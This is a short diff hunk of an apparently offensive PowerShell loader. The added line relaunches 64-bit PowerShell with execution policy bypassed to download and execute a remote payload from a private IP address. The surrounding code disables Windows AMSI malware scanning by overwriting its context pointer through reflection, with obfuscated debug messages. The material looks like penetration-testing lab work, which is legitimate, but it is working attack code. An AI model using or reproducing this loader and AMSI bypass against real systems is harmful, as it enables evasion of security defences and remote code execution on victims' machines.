@@ -22,6 +22,8 @@ function getDelegateType {
  return $type.CreateType()
 }
 
+if($env:PROCESSOR_ARCHITEW6432 -eq "AMD64"){ &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -Exec bypass -NonInteractive -NoProfile "iex (new-object net.webclient).downloadstring('http://192.168.45.208/payload.txt')"}
+
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d){if($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);if($ptr -ne 0){if($my_dbg){Write-Host "[+] Found 4m5iCtx"};[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);if($my_dbg){Write-Host "[+] Overwrote 4m5iCtx"}}
 $starttime = Get-Date -Displayhint Time
 Start-sleep -s 5
